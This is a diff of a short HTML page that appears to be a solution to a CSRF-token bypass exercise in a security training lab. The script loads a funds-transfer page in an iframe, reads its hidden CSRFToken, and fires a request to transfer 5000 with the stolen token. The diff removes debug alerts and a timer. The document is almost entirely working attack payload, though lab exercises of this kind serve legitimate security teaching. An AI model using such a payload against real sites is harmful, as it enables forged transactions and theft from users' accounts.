@@ -1,20 +1,12 @@
 Hello There!
 <iframe onload=setSecond() id="hello" src='attack?Screen=803158781&menu=900&transferFunds=main'></iframe>
 <img id="secondImg">
-
 <script type="text/javascript">
 	function setSecond() {
-
-		//alert("Hi There");
-		var secondImg = document.getElementById("secondImg")
-		alert("Token val: ");
+		var secondImg = document.getElementById("hello")
 		var firstImg = document.getElementById("hello").contentWindow.document.getElementsByName("CSRFToken")[0]
 		var token = firstImg.value
-		alert(token);
 		secondImg.src="attack?Screen=803158781&menu=900&transferFunds=5000" + "&CSRFToken=" + token;
 	}
-	function setTimer() {
-		var id = setInterval('setSecond();', 2500);
-	}
-	document.getElementById("hello").onload = setTimer();
+	document.getElementById("hello").onload = setSecond();
 </script>
